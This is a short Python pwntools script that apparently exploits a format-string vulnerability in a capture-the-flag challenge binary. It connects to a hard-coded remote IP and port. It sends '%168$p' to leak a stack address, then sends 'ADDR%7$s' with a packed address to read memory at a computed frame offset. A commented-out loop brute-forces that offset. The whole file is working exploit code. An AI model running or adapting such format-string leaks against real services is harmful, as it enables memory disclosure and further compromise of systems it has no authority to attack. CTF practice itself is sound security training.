#!/usr/bin/env python3
from pwn import *

context.clear(arch='amd64', os='linux') 
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf = ELF('./chall', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

IP = "14.225.212.104"
PORT = 9001

# for i in range(3, 1000):
#     p = remote(IP, PORT)
#     p.sendline(b"STACK: %168$p")
#     p.recvuntil(b"STACK: ")
#     RIP = int(p.recv(14), 16) - 20 * 0x8
#     log.info(f"RIP: {hex(RIP)}")

#     RBP = RIP - i * 0x8

#     if (RBP & 0xff == 0):
#         p.close()
#         continue

#     payload = b"ADDR%7$s" + p64(RBP)
#     p.send(payload)
#     p.recvuntil(b"ADDR")
#     leak = u64(p.recv(6).ljust(8, b'\x00'))
#     log.info(f"Leak: {hex(leak)}")

#     if (leak == RIP):
#         log.success("Got it!")
#         log.success(f"Final RIP: {hex(RIP)} at {i} offset")
#         break

#     p.close()

p = remote(IP, PORT)
p.sendline(b"STACK: %168$p")
p.recvuntil(b"STACK: ")
RIP = int(p.recv(14), 16)
log.info(f"RIP: {hex(RIP)}")

RBP = RIP - 184 * 0x8

payload = b"ADDR%7$s" + p64(RBP)
p.send(payload)
p.recvuntil(b"ADDR")
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leak: {hex(leak)}")

p.close()
